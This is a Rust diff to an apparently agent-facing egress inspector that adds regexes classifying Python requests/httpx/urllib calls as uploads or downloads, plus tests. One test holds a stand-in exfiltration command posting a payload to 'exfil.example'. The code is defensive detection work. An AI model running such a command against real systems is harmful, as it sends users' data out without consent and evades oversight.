@@ -279,6 +279,28 @@ fn detect_direction(command: &str) -> EgressDirection {
         return EgressDirection::Inbound;
     }
 
+    static PYTHON_UPLOAD_RE: OnceLock<Regex> = OnceLock::new();
+    let python_upload_re = PYTHON_UPLOAD_RE.get_or_init(|| {
+        Regex::new(
+            r"(?i)\b(?:requests|httpx)\.(?:post|put|patch|delete)\s*\(|\burllib\.request\.Request\s*\([^)]*\bdata\s*=",
+        )
+        .unwrap()
+    });
+    if python_upload_re.is_match(command) {
+        return EgressDirection::Outbound;
+    }
+
+    static PYTHON_DOWNLOAD_RE: OnceLock<Regex> = OnceLock::new();
+    let python_download_re = PYTHON_DOWNLOAD_RE.get_or_init(|| {
+        Regex::new(
+            r"(?i)\b(?:urllib\.request\.)?(?:urlopen|urlretrieve)\s*\(|\b(?:requests|httpx)\.(?:get|head)\s*\(",
+        )
+        .unwrap()
+    });
+    if python_download_re.is_match(command) {
+        return EgressDirection::Inbound;
+    }
+
     EgressDirection::Unknown
 }
 
@@ -556,6 +578,17 @@ mod tests {
             EgressDirection::Inbound
         );
 
+        assert_eq!(
+            detect_direction(
+                "python3 - <<'PY'\nfrom urllib.request import urlretrieve\nurlretrieve('https://arxiv.org/e-print/2608.10093', 'paper.tar')\nPY"
+            ),
+            EgressDirection::Inbound
+        );
+        assert_eq!(
+            detect_direction("python3 -c \"requests.post('https://exfil.example', data=payload)\""),
+            EgressDirection::Outbound
+        );
+
         // scp/rsync — last arg determines direction (dest is always last)
         assert_eq!(
             detect_direction("scp file.txt user@remote.com:/tmp/"),
@@ -605,6 +638,27 @@ mod tests {
             results[0].action,
             InspectionAction::RequireApproval(_)
         ));
+    }
+
+    #[tokio::test]
+    async fn python_download_egress_is_allowed() {
+        let inspector = EgressInspector::new();
+        let tool_requests = vec![ToolRequest {
+            id: "req-1".to_string(),
+            tool_call: Ok(CallToolRequestParams::new("shell").with_arguments(object!({
+                "command": "set -o pipefail\npython3 - <<'PY'\nfrom urllib.request import urlretrieve\nurlretrieve('https://arxiv.org/e-print/2608.10093', 'paper.tar')\nPY"
+            }))),
+            metadata: None,
+            tool_meta: None,
+        }];
+
+        let results = inspector
+            .inspect("session", &tool_requests, &[], GoslingMode::SmartApprove)
+            .await
+            .unwrap();
+
+        assert_eq!(results.len(), 1);
+        assert_eq!(results[0].action, InspectionAction::Allow);
     }
 
     /// Auto must not silently exfiltrate. This previously asserted `Allow`,
